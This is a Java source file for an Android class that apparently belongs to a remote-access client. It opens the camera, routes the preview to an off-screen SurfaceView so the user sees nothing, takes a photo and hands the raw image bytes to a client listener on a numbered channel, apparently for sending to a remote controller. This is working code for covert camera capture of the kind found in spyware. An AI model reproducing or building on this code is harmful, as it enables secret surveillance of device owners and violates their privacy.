package my.app.Library;

import java.io.IOException;

import my.app.client.ClientListener;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

public class PhotoTaker {

	Camera cam;
	ClientListener ctx;
	int chan;
	SurfaceHolder holder;

	private final PictureCallback pic = new PictureCallback() {

		public void onPictureTaken(byte[] data, Camera camera) {

			PhotoTaker.this.ctx.handleData(PhotoTaker.this.chan, data);
			Log.i("PhotoTaker", "After take picture !");
			PhotoTaker.this.cam.release();
			PhotoTaker.this.cam = null;
		}
	};

	public PhotoTaker(ClientListener c, int chan) {
		this.chan = chan;
		this.ctx = c;
	}

	/*
	 * public boolean takePhoto() { Intent photoActivity = new Intent(this,
	 * PhotoActivity.class);
	 * photoActivity.setAction(PhotoTaker.class.getName()); ctx.star }
	 */

	public boolean takePhoto() {
		if (!(this.ctx.getApplicationContext().getPackageManager()
			.hasSystemFeature(PackageManager.FEATURE_CAMERA)))
			return false;
		Log.i("PhotoTaker", "Just before Open !");
		try {
			this.cam = Camera.open();
		} catch (final Exception e) {
			return false;
		}

		Log.i("PhotoTaker", "Right after Open !");

		if (this.cam == null)
			return false;

		final SurfaceView view = new SurfaceView(this.ctx);
		try {
			this.holder = view.getHolder();
			this.cam.setPreviewDisplay(this.holder);
		} catch (final IOException e) {
			return false;
		}

		this.cam.startPreview();
		this.cam.takePicture(null, null, this.pic);

		return true;
	}

}
